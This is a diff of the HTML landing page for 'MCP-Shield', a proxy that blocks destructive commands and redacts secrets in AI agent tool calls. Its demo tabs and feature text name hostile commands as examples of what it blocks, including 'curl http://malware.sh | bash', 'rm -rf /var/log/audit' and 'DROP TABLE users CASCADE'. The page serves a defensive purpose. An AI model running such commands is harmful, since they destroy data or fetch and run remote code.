@@ -3,16 +3,16 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>MCP-Shield — Zero-Trust Security Proxy & DLP Firewall for AI Agents</title>
+  <title>MCP-Shield — Zero-Trust Security Proxy & In-Stream DLP for AI Agents</title>
   <meta name="description" content="Zero-Trust Security Proxy & In-Stream DLP Firewall for Model Context Protocol (MCP) and Autonomous AI Agents." />
   <link rel="icon" type="image/svg+xml" href="favicon.svg" />
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
   <link rel="stylesheet" href="style.css" />
 </head>
-<body>
-  <!-- Header -->
+<body class="dark-theme">
+  <!-- Header Navigation -->
   <header class="header">
     <div class="nav-container">
       <div class="brand">
@@ -20,8 +20,8 @@
         <span class="brand-name">MCP-SHIELD</span>
       </div>
       <nav class="nav">
-        <a href="#workbench" class="nav-link">Live Firewall</a>
-        <a href="#features" class="nav-link">Security Features</a>
+        <a href="#console" class="nav-link">Security Console</a>
+        <a href="#capabilities" class="nav-link">Architecture</a>
         <a href="#integration" class="nav-link">Integration</a>
         <a href="https://github.com/bhavukar/mcp-shield" target="_blank" rel="noopener" class="btn-github">
           <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
@@ -32,137 +32,121 @@
   </header>
 
   <main>
-    <!-- Hero Section -->
-    <section class="hero">
-      <div class="hero-container">
+    <!-- Hero with LightRays WebGL Background -->
+    <section class="hero-section">
+      <div id="light-rays-container" class="light-rays-container"></div>
+      
+      <div class="hero-content">
         <h1 class="hero-title">
-          Zero-Trust Firewall & DLP for AI Agents.
+          Zero-Trust Firewall & In-Stream DLP for AI Agents.
         </h1>
         <p class="hero-subtitle">
-          Intercept destructive shell commands, block rogue database drops, and scrub leaked API keys in real-time across your Model Context Protocol tool chains.
+          Real-time packet inspection for Model Context Protocol. Intercepts destructive OS commands, blocks unauthorized SQL table drops, and scrubs credentials in-flight.
         </p>
-        
+
         <div class="hero-actions">
           <div class="cli-box">
-            <span class="cli-prompt">$</span>
+            <span class="cli-prefix">$</span>
             <span class="cli-text">npx mcp-shield</span>
             <button class="copy-btn" onclick="copyCli()" title="Copy command">
               <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
           </div>
-          <a href="#workbench" class="btn-primary">Try Live Firewall</a>
+          <a href="#console" class="btn-cyan">Open Security Console</a>
         </div>
       </div>
     </section>
 
-    <!-- Marquee Tape -->
+    <!-- Marquee Ticker -->
     <div class="marquee-strip">
       <div class="marquee-track">
-        <span>ZERO-TRUST AGENT SECURITY</span>
+        <span>ZERO-TRUST FIREWALL</span>
         <span class="sep">/</span>
         <span>IN-FLIGHT DLP TOKEN REDACTION</span>
         <span class="sep">/</span>
         <span>SUB-MILLISECOND STREAM INSPECTION</span>
         <span class="sep">/</span>
-        <span>DROP-IN MCP PROXY</span>
+        <span>MODEL CONTEXT PROTOCOL PROXY</span>
         <span class="sep">/</span>
         <span>DESTRUCTIVE AST INTERCEPTOR</span>
         <span class="sep">/</span>
-        <span>ZERO-TRUST AGENT SECURITY</span>
+        <span>ZERO-TRUST FIREWALL</span>
         <span class="sep">/</span>
         <span>IN-FLIGHT DLP TOKEN REDACTION</span>
-        <span class="sep">/</span>
-        <span>SUB-MILLISECOND STREAM INSPECTION</span>
         <span class="sep">/</span>
       </div>
     </div>
 
-    <!-- Live Firewall Workbench -->
-    <section id="workbench" class="workbench-section">
-      <div class="workbench-container">
-        <div class="section-header">
-          <h2 class="section-title">Live Attack Simulation & Policy Interceptor</h2>
-          <p class="section-desc">Select an attack scenario below and watch MCP-Shield inspect JSON-RPC tool calls, redact secrets, or immediately reject dangerous payloads before execution.</p>
+    <!-- Live Security Console Section -->
+    <section id="console" class="console-section">
+      <div class="console-container">
+        <div class="section-heading-group">
+          <h2 class="section-title">Live Policy Interceptor & DLP Sandbox</h2>
+          <p class="section-subtitle">Select an attack payload below to observe real-time AST policy evaluation and token scrubbing.</p>
         </div>
 
-        <!-- Scenario Selector Tabs -->
-        <div class="scenarios-grid">
-          <button class="scenario-card active" data-scenario="rm_rf">
-            <div class="scenario-info">
-              <span class="scenario-name">Destructive Directory Removal</span>
-              <span class="scenario-meta">Payload: rm -rf /var/log/audit</span>
-            </div>
+        <!-- Scenario Switcher Pills -->
+        <div class="scenario-tabs">
+          <button class="scenario-tab active" data-scenario="rm_rf">
+            <span>Recursive Deletion (rm -rf)</span>
           </button>
-
-          <button class="scenario-card" data-scenario="drop_table">
-            <div class="scenario-info">
-              <span class="scenario-name">SQL Injection & Table Drop</span>
-              <span class="scenario-meta">Payload: DROP TABLE users CASCADE</span>
-            </div>
+          <button class="scenario-tab" data-scenario="drop_table">
+            <span>Destructive SQL (DROP TABLE)</span>
           </button>
-
-          <button class="scenario-card" data-scenario="leak_keys">
-            <div class="scenario-info">
-              <span class="scenario-name">Leaked AWS & OpenAI Keys</span>
-              <span class="scenario-meta">Payload: sk-proj-... & AKIA...</span>
-            </div>
+          <button class="scenario-tab" data-scenario="leak_keys">
+            <span>Leaked AWS & OpenAI Secrets</span>
           </button>
-
-          <button class="scenario-card" data-scenario="curl_pipe">
-            <div class="scenario-info">
-              <span class="scenario-name">Remote Script Execution Pipe</span>
-              <span class="scenario-meta">Payload: curl http://malware.sh | bash</span>
-            </div>
+          <button class="scenario-tab" data-scenario="curl_pipe">
+            <span>Remote Shell Pipe (curl | sh)</span>
           </button>
         </div>
 
-        <!-- Inspection Traffic Visualizer -->
-        <div class="workbench-box">
-          <!-- Column 1: Incoming Tool Call -->
-          <div class="stream-col">
-            <div class="col-header">
-              <span class="col-title">INCOMING AGENT TOOL CALL</span>
-              <span class="col-status unverified">RAW UNTRUSTED</span>
+        <!-- Cyber Console Workspace -->
+        <div class="console-card">
+          <!-- Left: Untrusted Incoming Traffic -->
+          <div class="console-pane">
+            <div class="pane-header">
+              <span class="pane-title">UNTRUSTED INCOMING TOOL CALL</span>
+              <span class="pane-tag unverified">JSON-RPC 2.0</span>
             </div>
-            <div class="code-container">
+            <div class="code-editor">
               <pre><code id="raw-payload-code">{}</code></pre>
             </div>
           </div>
 
-          <!-- Column 2: Interceptor Verdict -->
-          <div class="stream-col verdict-col">
-            <div class="col-header">
-              <span class="col-title">MCP-SHIELD VERDICT</span>
-              <span class="col-status" id="verdict-badge">BLOCKED</span>
-            </div>
-            <div class="verdict-card" id="verdict-card">
-              <div class="verdict-indicator" id="verdict-indicator">
-                <div class="indicator-text">
-                  <span class="verdict-title" id="verdict-title">RULE SEC-001 TRIGGERED</span>
-                  <span class="verdict-reason" id="verdict-reason">Destructive recursive directory removal detected.</span>
-                </div>
-              </div>
-
-              <div class="verdict-meta-grid">
-                <div class="meta-item">
-                  <span class="meta-label">LATENCY OVERHEAD</span>
-                  <span class="meta-val">0.32 ms</span>
-                </div>
-                <div class="meta-item">
-                  <span class="meta-label">DLP REDACTIONS</span>
-                  <span class="meta-val" id="meta-redactions">0 tokens</span>
-                </div>
-                <div class="meta-item">
-                  <span class="meta-label">FORWARDED</span>
-                  <span class="meta-val" id="meta-forwarded">NO (REJECTED)</span>
-                </div>
-              </div>
+          <!-- Right: Firewall Verdict & Sanitized Stream -->
+          <div class="console-pane verdict-pane">
+            <div class="pane-header">
+              <span class="pane-title">SHIELD INTERCEPTION VERDICT</span>
+              <span class="pane-tag" id="verdict-tag">BLOCKED</span>
             </div>
 
-            <!-- Sanitized / Return Message -->
-            <div class="output-preview">
-              <span class="preview-label">RESPONSE DELIVERED TO AGENT:</span>
-              <div class="code-container mini">
+            <div class="verdict-display" id="verdict-display">
+              <div class="verdict-info">
+                <span class="verdict-rule-id" id="verdict-rule-id">RULE SEC-001 TRIGGERED</span>
+                <span class="verdict-message" id="verdict-message">Destructive recursive directory removal detected on root/system path.</span>
+              </div>
+
+              <div class="telemetry-bar">
+                <div class="telemetry-item">
+                  <span class="tel-label">INSPECTION OVERHEAD</span>
+                  <span class="tel-val">0.24 ms</span>
+                </div>
+                <div class="telemetry-item">
+                  <span class="tel-label">DLP MASKED</span>
+                  <span class="tel-val" id="tel-masked">0 tokens</span>
+                </div>
+                <div class="telemetry-item">
+                  <span class="tel-label">FORWARD STATUS</span>
+                  <span class="tel-val" id="tel-forward">REJECTED</span>
+                </div>
+              </div>
+            </div>
+
+            <!-- Sanitized Response Box -->
+            <div class="response-box">
+              <span class="response-label">DELIVERED TO AGENT:</span>
+              <div class="code-editor compact">
                 <pre><code id="sanitized-payload-code">{}</code></pre>
               </div>
             </div>
@@ -171,33 +155,37 @@
       </div>
     </section>
 
-    <!-- Features Section -->
-    <section id="features" class="features-section">
-      <div class="features-container">
-        <div class="section-header">
-          <h2 class="section-title">Engineered for Zero-Trust Agent Security</h2>
-          <p class="section-desc">Keep your production infrastructure safe from prompt injections, hallucinations, and rogue subagents.</p>
+    <!-- Security Architecture Capabilities -->
+    <section id="capabilities" class="capabilities-section">
+      <div class="capabilities-container">
+        <div class="section-heading-group">
+          <h2 class="section-title">Zero-Trust Agent Security Architecture</h2>
+          <p class="section-subtitle">Full-spectrum defense against prompt injections, rogue tool calls, and credential leakage.</p>
         </div>
 
-        <div class="features-grid">
-          <div class="feature-card">
-            <h3 class="feature-name">Destructive Command Interception</h3>
-            <p class="feature-text">Pre-execution AST parsing stops dangerous commands like <code>rm -rf /</code>, <code>DROP TABLE</code>, <code>chmod 777</code>, and force pushes before they reach the OS shell or database.</p>
+        <div class="capabilities-grid">
+          <div class="cap-card">
+            <span class="cap-num">01</span>
+            <h3 class="cap-title">Destructive Command Interception</h3>
+            <p class="cap-text">AST-level pre-execution matching intercepts commands like <code>rm -rf /</code>, <code>DROP TABLE</code>, <code>chmod 777</code>, and force pushes before they execute.</p>
           </div>
 
-          <div class="feature-card">
-            <h3 class="feature-name">In-Stream Zero-Latency DLP</h3>
-            <p class="feature-text">Automatically scrubs AWS keys, OpenAI API tokens, GitHub PATs, private SSH keys, and connection passwords from tool call arguments and responses in-flight.</p>
+          <div class="cap-card">
+            <span class="cap-num">02</span>
+            <h3 class="cap-title">In-Stream Zero-Latency DLP</h3>
+            <p class="cap-text">Sub-millisecond regex scanning automatically scrubs AWS access keys, OpenAI tokens, GitHub PATs, JWTs, and database URIs from tool arguments and outputs.</p>
           </div>
 
-          <div class="feature-card">
-            <h3 class="feature-name">Transparent stdio / SSE Proxy</h3>
-            <p class="feature-text">Zero code modifications required. Wraps any existing MCP server binary seamlessly with less than 0.5ms inspection overhead.</p>
+          <div class="cap-card">
+            <span class="cap-num">03</span>
+            <h3 class="cap-title">Transparent stdio / SSE Proxy</h3>
+            <p class="cap-text">Zero code modifications needed. Wraps any existing MCP server binary seamlessly with less than 0.5ms inspection overhead.</p>
           </div>
 
-          <div class="feature-card">
-            <h3 class="feature-name">Configurable Enforcement Modes</h3>
-            <p class="feature-text">Run in <code>enforce</code> mode to block risky actions, <code>audit</code> mode for zero-interruption compliance logging, or <code>permissive</code> mode for live secret sanitization.</p>
+          <div class="cap-card">
+            <span class="cap-num">04</span>
+            <h3 class="cap-title">Configurable Enforcement Modes</h3>
+            <p class="cap-text">Run in <code>enforce</code> mode to reject malicious requests, <code>audit</code> mode for non-blocking compliance logs, or <code>permissive</code> mode for in-place data masking.</p>
           </div>
         </div>
       </div>
@@ -206,9 +194,9 @@
     <!-- Integration Section -->
     <section id="integration" class="integration-section">
       <div class="integration-container">
-        <div class="section-header">
-          <h2 class="section-title">Drop-in Integration</h2>
-          <p class="section-desc">Wrap any existing MCP server in seconds.</p>
+        <div class="section-heading-group">
+          <h2 class="section-title">Drop-in MCP Integration</h2>
+          <p class="section-subtitle">Secure Claude Desktop, Cursor, or your custom Node.js agents in seconds.</p>
         </div>
 
         <div class="config-tabs">
@@ -243,7 +231,7 @@ mcp-shield --mode=audit -- npx -y @modelcontextprotocol/server-filesystem /Users
       <div class="footer-links">
         <a href="https://github.com/bhavukar/mcp-shield" target="_blank" rel="noopener">GitHub Repository</a>
         <a href="https://modelcontextprotocol.io/" target="_blank" rel="noopener">Model Context Protocol</a>
-        <a href="#workbench">Live Firewall</a>
+        <a href="#console">Security Console</a>
       </div>
     </div>
     <div class="footer-bottom">
@@ -251,6 +239,6 @@ mcp-shield --mode=audit -- npx -y @modelcontextprotocol/server-filesystem /Users
     </div>
   </footer>
 
-  <script src="app.js"></script>
+  <script type="module" src="app.js"></script>
 </body>
 </html>
